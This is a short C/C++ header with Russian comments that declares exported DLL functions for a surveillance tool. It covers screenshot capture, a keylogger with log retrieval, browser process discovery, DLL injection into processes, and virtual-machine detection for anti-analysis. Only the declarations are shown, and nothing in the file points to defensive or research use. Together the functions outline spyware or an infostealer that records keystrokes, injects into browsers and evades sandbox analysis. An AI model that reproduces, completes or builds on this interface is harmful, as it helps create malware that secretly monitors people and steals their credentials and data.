#include <vector>
#include <string>
#include <mutex>

// --- Сбор данных ---
DLLEXPORT bool CaptureScreenshot(char** base64ImageData, size_t* dataSize);
DLLEXPORT void FreeScreenshotData(char* base64ImageData);
DLLEXPORT bool StartKeylogger();
DLLEXPORT bool StopKeylogger();
DLLEXPORT char* GetKeyLogs(); // Возвращает JSON строку, освобождать через FreeString
DLLEXPORT void FreeString(char* str);

// --- Поиск процессов --- 
typedef struct {
    DWORD processId;
    wchar_t processName[260]; // MAX_PATH
} BrowserProcessInfo;

DLLEXPORT bool FindBrowserProcesses(BrowserProcessInfo** processes, size_t* count);
DLLEXPORT void FreeBrowserProcesses(BrowserProcessInfo* processes);

// --- Инъекции ---
DLLEXPORT bool InjectDLL(DWORD processId, const char* dllPath);

// --- Анти-анализ ---
DLLEXPORT bool IsVMEnvironmentDetected(); 